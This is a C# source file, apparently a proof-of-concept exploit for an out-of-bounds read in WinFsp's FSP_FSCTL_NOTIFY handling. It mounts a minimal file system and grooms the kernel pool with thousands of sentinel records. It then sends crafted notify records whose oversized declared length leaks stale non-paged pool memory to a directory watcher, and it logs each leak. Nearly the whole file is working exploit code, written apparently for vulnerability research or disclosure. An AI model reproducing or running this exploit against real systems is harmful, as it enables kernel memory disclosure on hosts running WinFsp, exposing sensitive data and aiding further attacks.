using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;
using Fsp;
using Fsp.Interop;
using FileInfo = Fsp.Interop.FileInfo;

// WinFsp FSP_FSCTL_NOTIFY per-record Size OOB read -> kernel memory disclosure PoC (v3, groomed)
//
// Strategy:
//  * SPRAY: many benign NOTIFY records whose buffer is fully filled with sentinel 'K' (0x4B) and
//    whose Buffer[0]='K' (!= '\\') so they allocate+fill+free a work-item WITHOUT delivering.
//    The freed blocks (a given pool size-class) now hold 'K' in their tail slack.
//  * MALICIOUS: a slightly-smaller record (same size-class) reuses a freed K-block. Its declared
//    per-record Size over-reads a few WCHARs past the buffer into the SAME block's slack (no pool
//    header in between) -> the walked FileName = "\PWNPWN"+<mmm my filler>+<KKK leaked slack>.
//    Any 'K' delivered beyond our buffer length is stale non-paged-pool from a *freed* allocation.

class MinimalFs : FileSystemBase
{
    private byte[] _sd;
    public MinimalFs(byte[] sd) { _sd = sd; }
    public override int Init(object Host) { return 0; }
    public override int GetVolumeInfo(out VolumeInfo vi)
    { vi = default(VolumeInfo); vi.TotalSize = 1UL << 30; vi.FreeSize = 1UL << 30; return 0; }
    private void DirInfo(out FileInfo fi)
    {
        fi = default(FileInfo); fi.FileAttributes = 0x10;
        ulong t = (ulong)DateTime.UtcNow.ToFileTimeUtc();
        fi.CreationTime = fi.LastAccessTime = fi.LastWriteTime = fi.ChangeTime = t;
    }
    public override int GetSecurityByName(string FileName, out uint FileAttributes, ref byte[] SecurityDescriptor)
    { FileAttributes = 0; if (FileName == "\\") { FileAttributes = 0x10; SecurityDescriptor = _sd; return 0; } return unchecked((int)0xC0000034); }
    public override int Open(string FileName, uint CreateOptions, uint GrantedAccess,
        out object FileNode, out object FileDesc, out FileInfo FileInfo, out string NormalizedName)
    { FileNode = null; FileDesc = null; NormalizedName = "\\"; DirInfo(out FileInfo); if (FileName == "\\") { FileNode = "root"; return 0; } return unchecked((int)0xC0000034); }
    public override int GetFileInfo(object FileNode, object FileDesc, out FileInfo FileInfo) { DirInfo(out FileInfo); return 0; }
    public override int GetSecurity(object FileNode, object FileDesc, ref byte[] SecurityDescriptor) { SecurityDescriptor = _sd; return 0; }
    public override int ReadDirectory(object FileNode, object FileDesc, string Pattern, string Marker, IntPtr Buffer, uint Length, out uint BytesTransferred) { BytesTransferred = 0; return 0; }
    public override void Close(object FileNode, object FileDesc) { }
}

static class Program
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr CreateFileW(string name, uint access, uint share, IntPtr sec, uint disp, uint flags, IntPtr tmpl);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadDirectoryChangesW(IntPtr h, byte[] buf, uint len, bool subtree, uint filter, out uint br, IntPtr o, IntPtr c);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll", SetLastError = true)] static extern bool CancelIoEx(IntPtr h, IntPtr o);
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool ConvertStringSecurityDescriptorToSecurityDescriptorW(string sddl, uint rev, out IntPtr psd, out uint size);
    [DllImport("kernel32.dll")] static extern IntPtr LocalFree(IntPtr p);
    [DllImport("winfsp-x64.dll", CallingConvention = CallingConvention.StdCall)] static extern int FspFileSystemNotifyBegin(IntPtr fs, uint timeout);
    [DllImport("winfsp-x64.dll", CallingConvention = CallingConvention.StdCall)] static extern int FspFileSystemNotifyEnd(IntPtr fs);
    [DllImport("winfsp-x64.dll", CallingConvention = CallingConvention.StdCall)] static extern int FspFileSystemNotify(IntPtr fs, byte[] notifyInfo, UIntPtr size);

    const uint FILE_LIST_DIRECTORY = 1, FILE_SHARE_ALL = 7, OPEN_EXISTING = 3, FILE_FLAG_BACKUP_SEMANTICS = 0x02000000;
    static StreamWriter L;
    static volatile bool g_stop = false;
    static IntPtr g_dir = (IntPtr)(-1);
    static string g_root;
    static int g_deliveries = 0, g_leaks = 0;
    static int g_myBufBytes = 0; // malicious InputBufferLength; anything beyond (this-12)/2 WCHARs of FileName is OOB

    static void Log(string s) { lock (L) { L.WriteLine(s); Console.WriteLine(s); } }

    static byte[] BuildSd()
    {
        IntPtr psd; uint sz;
        if (!ConvertStringSecurityDescriptorToSecurityDescriptorW("O:BAG:BAD:P(A;;FA;;;WD)", 1, out psd, out sz))
            throw new Exception("SD fail " + Marshal.GetLastWin32Error());
        byte[] sd = new byte[sz]; Marshal.Copy(psd, sd, 0, (int)sz); LocalFree(psd); return sd;
    }

    static void Watcher()
    {
        g_dir = CreateFileW(g_root, FILE_LIST_DIRECTORY, FILE_SHARE_ALL, IntPtr.Zero, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, IntPtr.Zero);
        if (g_dir == (IntPtr)(-1)) { Log("[watcher] open FAILED " + Marshal.GetLastWin32Error()); return; }
        byte[] buf = new byte[256 * 1024];
        while (!g_stop)
        {
            uint br;
            if (!ReadDirectoryChangesW(g_dir, buf, (uint)buf.Length, false, 0x1FF, out br, IntPtr.Zero, IntPtr.Zero))
            { if (!g_stop) Log("[watcher] RDCW ended err=" + Marshal.GetLastWin32Error()); break; }
            int off = 0;
            while (off + 12 <= br)
            {
                int next = BitConverter.ToInt32(buf, off);
                int nameLen = BitConverter.ToInt32(buf, off + 8);
                int myFileNameWchars = (g_myBufBytes - 12) / 2;      // WCHARs that came from OUR buffer
                var chars = new StringBuilder(); var hex = new StringBuilder();
                int leakedK = 0, wi = 0;
                for (int i = 0; i + 1 < nameLen; i += 2, wi++)
                {
                    ushort w = BitConverter.ToUInt16(buf, off + 12 + i);
                    chars.Append(w >= 0x20 && w < 0x7f ? (char)w : '.');
                    hex.Append(w.ToString("X4") + " ");
                    // NOTE: delivered name has leading '\' stripped, so WCHAR index wi corresponds to
                    // FileName index wi+1; OOB region begins at FileName index (myFileNameWchars).
                    if (wi + 1 >= myFileNameWchars && w == 0x004B) leakedK++;
                }
                g_deliveries++;
                if (leakedK > 0) g_leaks++;
                Log(string.Format("[DELIV{0}] nameBytes={1} leakedK={2} text=\"{3}\" wchars=[ {4}]",
                    leakedK > 0 ? " **LEAK**" : "", nameLen, leakedK, chars, hex));
                if (next == 0) break; off += next;
            }
        }
        Log("[watcher] stopped deliveries=" + g_deliveries + " leaks=" + g_leaks);
    }

    // build a NOTIFY record buffer of a given InputBufferLength.
    static byte[] Rec(int inputBufLen, int declaredSize, string prefix, ushort fillAfterPrefix)
    {
        byte[] b = new byte[inputBufLen];
        b[0] = (byte)(declaredSize & 0xff); b[1] = (byte)((declaredSize >> 8) & 0xff);
        BitConverter.GetBytes((uint)0x1FF).CopyTo(b, 4); // Filter
        BitConverter.GetBytes((uint)1).CopyTo(b, 8);     // Action=ADDED
        byte[] pb = Encoding.Unicode.GetBytes(prefix);
        Array.Copy(pb, 0, b, 12, Math.Min(pb.Length, inputBufLen - 12));
        for (int o = 12 + pb.Length; o + 1 < inputBufLen; o += 2)
        { b[o] = (byte)(fillAfterPrefix & 0xff); b[o + 1] = (byte)(fillAfterPrefix >> 8); }
        return b;
    }

    static int Main(string[] args)
    {
        string drive = args.Length > 0 ? args[0] : "Z";
        int spraySize = args.Length > 1 ? int.Parse(args[1]) : 128; // spray InputBufferLength (fills size-class)
        int malSize   = args.Length > 2 ? int.Parse(args[2]) : 114; // malicious InputBufferLength (same class, smaller)
        int declared  = args.Length > 3 ? int.Parse(args[3]) : 128; // malicious record.Size (over-reads to block tail)
        int cycles    = args.Length > 4 ? int.Parse(args[4]) : 30;
        int sprayN    = args.Length > 5 ? int.Parse(args[5]) : 4000;
        int malN      = args.Length > 6 ? int.Parse(args[6]) : 150;
        g_myBufBytes = malSize;
        g_root = drive + ":\\";
        L = new StreamWriter("C:\\WinFspTest\\leak\\leak-result.log", false) { AutoFlush = true };
        Log(string.Format("=== disclosure PoC v3 {0}  spraySize={1} malSize={2} declared=0x{3:X} cycles={4} sprayN={5} malN={6} ===",
            DateTime.Now, spraySize, malSize, declared, cycles, sprayN, malN));

        var host = new FileSystemHost(new MinimalFs(BuildSd()));
        host.SectorSize = 512; host.SectorsPerAllocationUnit = 1; host.MaxComponentLength = 255;
        host.FileInfoTimeout = 1000; host.CasePreservedNames = true; host.UnicodeOnDisk = true;
        host.PersistentAcls = true; host.PostCleanupWhenModifiedOnly = true;
        host.VolumeCreationTime = (ulong)DateTime.UtcNow.ToFileTimeUtc(); host.VolumeSerialNumber = 0x4C45414B;
        host.FileSystemName = "LEAKFS";
        int st = host.Mount(drive + ":", null, false, 0);
        if (st != 0) { Log("MOUNT FAILED 0x" + st.ToString("X8")); return 2; }
        Log("[+] mounted " + g_root);
        IntPtr fsPtr = (IntPtr)typeof(FileSystemHost).GetField("_FileSystemPtr",
            System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance).GetValue(host);
        Log("[+] FSP_FILE_SYSTEM* = 0x" + fsPtr.ToInt64().ToString("X"));

        var wt = new Thread(Watcher) { IsBackground = true }; wt.Start();
        Thread.Sleep(500);

        // spray record: whole buffer 'K', Buffer[0]='K' (!= '\\') so it never delivers; Size valid (no over-read)
        byte[] sprayRec = Rec(spraySize, 14, "K", 0x004B);
        // malicious record: starts with '\PWNPWN', filler 'm' (0x6D) up to malSize, Size over-reads into K slack
        byte[] malRec = Rec(malSize, declared, "\\PWNPWN", 0x006D);

        FspFileSystemNotifyBegin(fsPtr, 2000);
        for (int c = 0; c < cycles && g_leaks == 0; c++)
        {
            for (int i = 0; i < sprayN; i++) FspFileSystemNotify(fsPtr, sprayRec, (UIntPtr)sprayRec.Length);
            Thread.Sleep(120); // let async workers free the K-blocks
            for (int i = 0; i < malN; i++) { FspFileSystemNotify(fsPtr, malRec, (UIntPtr)malRec.Length); Thread.Sleep(3); }
            Thread.Sleep(120);
            if ((c % 5) == 0) Log(string.Format("[cycle {0}] deliveries={1} leaks={2}", c, g_deliveries, g_leaks));
        }
        FspFileSystemNotifyEnd(fsPtr);
        Thread.Sleep(600);

        Log(string.Format("[*] DONE. deliveries={0} leaks={1}  (leak = 'K' bytes delivered beyond our {2}-byte buffer)",
            g_deliveries, g_leaks, malSize));
        g_stop = true;
        try { CancelIoEx(g_dir, IntPtr.Zero); } catch { }
        try { CloseHandle(g_dir); } catch { }
        wt.Join(1500);
        try { host.Unmount(); } catch { }
        L.Flush();
        Environment.Exit(0);
        return 0;
    }
}
